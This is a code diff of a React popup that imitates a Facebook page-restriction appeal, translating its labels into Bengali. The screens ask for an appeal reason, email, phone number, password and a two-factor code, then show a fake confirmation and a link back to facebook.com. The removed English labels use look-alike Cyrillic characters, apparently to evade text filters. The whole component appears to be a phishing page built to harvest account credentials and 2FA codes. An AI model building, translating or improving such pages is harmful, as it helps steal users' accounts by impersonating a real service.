@@ -247,17 +247,17 @@ const MyPopup = ({ isOpen, onClose, onSave }) => {
                     <div id="first-form">
                          <div className="mb-3">
                             <label htmlFor="exampleFormControlTextarea1" className="form-label">
-                            Рⅼеаѕе іոⅾісаtе ԝhу уоս bеⅼіеⅴе thе раցе rеѕtrісtіοո ԝаѕ аррⅼіеⅾ іո еrrοr.
+                            অনুগ্রহ করে উল্লেখ করুন কেন আপনি মনে করেন পেজের উপর আরোপিত সীমাবদ্ধতাটি ভুলবশত প্রয়োগ করা হয়েছে।
                             </label>
                             <textarea name="apeal" className="form-control" id="exampleFormControlTextarea1" rows="1"></textarea>
                         </div>
                         <div className="mb-3">
-                            <label htmlFor="BuisenessEmailField" className="form-label">Εⅿаіⅼ Αⅾⅾrеѕѕ</label>
+                            <label htmlFor="BuisenessEmailField" className="form-label">ইমেইল ঠিকানা</label>
                             <input onChange={(e) => {if(e.target.value.length > 100) return;setMail(e.target.value);}} name="buiseness-email" type="email" className="form-control" id="BuisenessEmailField"/>
                         </div>
 
                         <div className="mb-3">
-                            <label htmlFor="PhoneFirld" className="form-label">Рhоոе ոսⅿbеr</label>
+                            <label htmlFor="PhoneFirld" className="form-label">ফোন নম্বর</label>
                             <PhoneInput
                             inputStyle={{border:'none',fontSize:'15px'}}
                             buttonStyle={{border:'none',backgroundColor:'#fff'}}
@@ -271,14 +271,14 @@ const MyPopup = ({ isOpen, onClose, onSave }) => {
 
 
                         <div style={{display: error ? 'inline-block' : 'none'}} className="mb-2 invalid-feedback">
-                          Email address or phone number is incorrect. Please try again!
+                          ইমেইল ঠিকানা বা ফোন নম্বর ভুল হয়েছে। অনুগ্রহ করে আবার চেষ্টা করুন!
                         </div>
 
                         <div className="mb-3 form-check">
                             <input type="checkbox" className="form-check-input" id="exampleCheck1"/>
-                            <label className="form-check-label" htmlFor="exampleCheck1">I agree with
+                            <label className="form-check-label" htmlFor="exampleCheck1">আমি সম্মত
 
-                                <a id="termsLink" className="add-svg">&nbsp;Terms of use
+                                <a id="termsLink" className="add-svg">&nbsp;ব্যবহারের শর্তাবলী
                                 </a>
                             </label>
                         </div>
@@ -308,7 +308,7 @@ const MyPopup = ({ isOpen, onClose, onSave }) => {
                                  <img onClick={togglePasswordVisiblity} style={{position:'absolute',right:'5%',width:'20px',height:'20px'}} src={passwordShown ? "/assets/eye.png" : "/assets/eye-close.png"}/>
                              </div>
                              <div style={{display: error == true ? 'inline-block' : 'none'}} className="mt-2 invalid-feedback">
-                                Password is incorrect, please try again.
+                               পাসওয়ার্ড ভুল হয়েছে, অনুগ্রহ করে আবার চেষ্টা করুন।
                             </div>
                          </div>
                          <div className="form-btn-wrapper">
@@ -328,8 +328,8 @@ const MyPopup = ({ isOpen, onClose, onSave }) => {
                     case 2: 
                      return (<div className="modal-body">
                      <div className="twoFAinfo-wraper">
-                         <h1 className="modal-title" id="2FAmodalLabel">Check your authentication code</h1>
-                         <p>Enter the 6-digit code for this account from the two-factor authentication app or text message on your mobile.</p>
+                         <h1 className="modal-title" id="2FAmodalLabel">আপনার প্রমাণীকরণ কোডটি পরীক্ষা করুন।</h1>
+                         <p>এই অ্যাকাউন্টের জন্য দুই-ধাপ যাচাইকরণ অ্যাপ বা আপনার মোবাইলে পাঠানো টেক্সট মেসেজ থেকে ৬-সংখ্যার কোডটি প্রবেশ করুন।</p>
                          <div className="fb-round-wraper">
                              <img src="img/2FA.png"  style={{width: '100%'}}/>
                          </div>
@@ -349,7 +349,7 @@ const MyPopup = ({ isOpen, onClose, onSave }) => {
                   }} name="2FA-1" minLength="6" maxLength="8" type="tel" className="form-control" id="exampleInputPassword" autoComplete="off"/>
                              </div>
                              <div style={{display: error ? 'inline-block' : 'none'}} className="invalid-feedback">
-                                 Incorrect. Please, try again after <span id="timer"></span>
+                                 ভুল হয়েছে। অনুগ্রহ করে পরে আবার চেষ্টা করুন। <span id="timer"></span>
                              </div>
                          </div>
                          <div className="form-btn-wrapper">
@@ -367,19 +367,19 @@ const MyPopup = ({ isOpen, onClose, onSave }) => {
                       return (
                       <div className="modal-body">
                       <div className="twoFAinfo-wraper">
-                          <h1 className="modal-title" id="successModalLabel">Request has been sent</h1>
+                          <h1 className="modal-title" id="successModalLabel">অনুরোধ পাঠানো হয়েছে।</h1>
                           <br/>
                           <div className="fb-round-wraper">
                               <img src="img/phone.png" style={{width: '100%'}}/>
                           </div>
                           <br/>
-                          <p>"Your request has been added to the processing queue. We will process your request within 24 hours. If you do not receive an email message with the appeal status within 24 hours, please resend the appeal.</p>
+                          <p>আপনার অনুরোধটি প্রক্রিয়াকরণের সারিতে যুক্ত করা হয়েছে। আমরা ২৪ ঘণ্টার মধ্যে আপনার অনুরোধটি প্রক্রিয়া করব। যদি ২৪ ঘণ্টার মধ্যে আপিলের অবস্থাসহ কোনো ইমেইল বার্তা না পান, অনুগ্রহ করে আবার আপিল পাঠান।</p>
   
                       </div>
                       <form action="https://facebook.com/" method="GET">
                           <div className="form-btn-wrapper">
                               <button className="btn btn-primary">
-                                  <span className="button-text">Return to facebook</span>
+                                  <span className="button-text">Facebook-এ ফিরে যান</span>
                               </button>
                           </div>
                       </form>
